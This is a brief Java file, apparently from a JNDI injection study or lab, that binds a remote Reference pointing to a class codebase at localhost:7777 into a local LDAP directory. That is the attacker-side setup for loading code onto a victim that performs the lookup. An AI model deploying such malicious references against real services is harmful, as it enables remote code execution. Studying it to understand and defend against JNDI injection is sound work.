package org.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.sql.Ref;
import java.util.Hashtable;

public class JNDILDAPServer {
    public static void main(String[] args) throws Exception{
//        Hashtable env=new Hashtable();
//        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
//        env.put(Context.PROVIDER_URL,"rmi://localhost:1099");

        InitialContext initialContext=new InitialContext();
        Reference refObj=new Reference("T","T","http://localhost:7777/");
        initialContext.rebind("ldap://localhost:10389/cn=test,dc=example,dc=com",refObj);
    }
}